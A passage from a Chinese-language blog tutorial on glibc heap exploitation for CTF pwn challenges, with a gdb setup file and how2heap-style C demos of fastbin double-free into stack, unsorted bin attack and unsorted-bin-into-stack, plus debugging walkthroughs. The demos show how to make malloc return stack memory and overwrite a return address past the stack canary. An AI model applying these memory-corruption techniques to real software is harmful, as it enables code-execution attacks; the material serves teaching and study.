class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line">source ~/peda/peda.py</span><br><span class="line">source ~/Pwngdb/pwngdb.py</span><br><span class="line">source ~/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment">#set context-clear-screen on</span></span><br><span class="line"><span class="comment">#set debug-events off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#source /root/splitmind/gdbinit.py</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections = &quot;regs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mode = input(&quot;source/disasm/mixed mode:?(s/d/m)&quot;) or &quot;d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import splitmind</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter = splitmind.Mind()</span></span><br><span class="line"><span class="comment">#spliter.select(&quot;main&quot;).right(display=&quot;regs&quot;, size=&quot;50%&quot;)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-stack-lines 10&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#legend_on = &quot;code&quot;</span></span><br><span class="line"><span class="comment">#if mode == &quot;d&quot;:</span></span><br><span class="line"><span class="comment">#    legend_on = &quot;disasm&quot;</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;disasm&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elif mode == &quot;s&quot;:</span></span><br><span class="line"><span class="comment">#    sections += &quot; code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;, banner=&quot;none&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 30&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line"><span class="comment">#    sections += &quot; disasm code&quot;</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;main&quot;).above(display=&quot;code&quot;, size=&quot;70%&quot;)</span></span><br><span class="line"><span class="comment">#    spliter.select(&quot;code&quot;).below(display=&quot;disasm&quot;, size=&quot;40%&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-code-lines 8&quot;)</span></span><br><span class="line"><span class="comment">#    gdb.execute(&quot;set context-source-code-lines 20&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sections += &quot; args stack backtrace expressions&quot;</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;legend&quot;, on=legend_on)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;stack&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;backtrace&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;args&quot;, on=&quot;regs&quot;)</span></span><br><span class="line"><span class="comment">#spliter.show(&quot;expressions&quot;, on=&quot;args&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set context-sections \&quot;%s\&quot;&quot; % sections)</span></span><br><span class="line"><span class="comment">#gdb.execute(&quot;set show-retaddr-reg on&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#spliter.build()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure></div>
<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><ul>
<li>house_of_spirit<br><a class="link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1819636-1-1.html" >LCTF 2016 : PWN200 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="built_in">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>使用<code>ubuntu:16.04</code>进行编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png"
                     
                ><br>使用<code>pwncli</code>改写<code>rpath</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRQV6TQJYQWAXFV.png"
                     
                ><br>在malloc三次后， 0x400743处下断点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_U8FQ8QMKCMJEEHE.png"
                     
                ><br>查看堆信息,三个fastbin的堆块，f1,f2,f3。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YBSW3KZB8CFB9PV.png"
                     
                ><br>在free(f1),free(f2),free(f1)后，在0x40083B下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XRP63QAXTP42DB4.png"
                     
                ><br>查看fastbinY信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5PQAMT3K7NY6GSP.png"
                     
                ><br>0x20大小的fastbins链上形成了double free。<br>再次malloc两次后，设断点在0x40089F<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B4MCXD5ETFVSG4E.png"
                     
                ><br>再次查看bins，因为申请两次后，fastbins中剩下f1(0x60300)，而0x60300指向0x603020没有改变，0x603020指向0x60300也没变，并且fastbins中的chunk标记为prev_inuse一直为1，所以fastbins中依然保留这个ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7QJAPUB4DDD2PHB.png"
                     
                ><br>接下来，查看汇编代码，StackVar值改为0x20，为了放入0x20大小的fastbins,接下来把f1指向了StackVar以上0x8处，也就是prev_size的位置。将StackVar放入了0x20的fastbins中。在0x40092C处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PUYYFZPQXKV9KS.png"
                     
                ><br>查看堆信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_TMDXE86NU7SRWS3.png"
                     
                ><br>这时候在申请两次便可申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_WBDHQYTZ4AXN4ZB.png"
                     
                ><br>在0x40095c下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D7WDB4DZ4DJS79F.png"
                     
                ><br>可以看到，已经申请到了栈上的值。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04进行编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>首先申请了两个堆块，第一个堆块不属于fastbin大小，先进入unsortedbin中，第二个堆块为了防止第一块堆块与topchunk合并。在free第一个堆块前设置断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CHJZNE3YDAFDZMS.png"
                     
                ><br>查看bins和heap信息<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CKURHWFQTKVYSZ4.png"
                     
                ><br>free第一个chunk以后，bins和heap信息，unsortedbin里的第一个chunk的fd和bk指向main_arena+0x58的位置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_E396T5K2YSZR35Q.png"
                     
                ><br>接下来利用uaf将unsortedbin中的第一个chunk的bk指针（rax存储的指针指向fd,rax+8指向bk,bk指向后加入的chunk）指向StackVar的prev_size位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_UC93S5J8Q2CNP72.png"
                     
                ><br>在0x4007D9处下断点，查看heap和bins信息。可以看到，0x602000处的chunk的bk指针被改为了一个栈值，fd指向main_arena+0x58的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922101848230.png"
                      alt="image-20230922101848230"
                ><br>再次将unsortedbin中第一个chunk给malloc出来以后，unsortedbin中仅剩StackVar-0x10。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZJY9Q5VVBT68CZ3.png"
                     
                ><br>在0x400828下断点。查看heap和bins信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Z4EUWZVH32R7NCC.png"
                     
                ><br>可以看到，StackVar的fd指针即用户区域起始处已被修改为main_arena+0x58的值。</p>
<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">	<span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>首先申请两个堆块<br>第一次申请的0x100大小的堆块给了[rbp+ptr]。第二个0x100是阻断topchunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SKW8ZP7TMRGT4KH.png"
                     
                ><br>接下来free(ptr)，把ptr放入unsorted bin中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
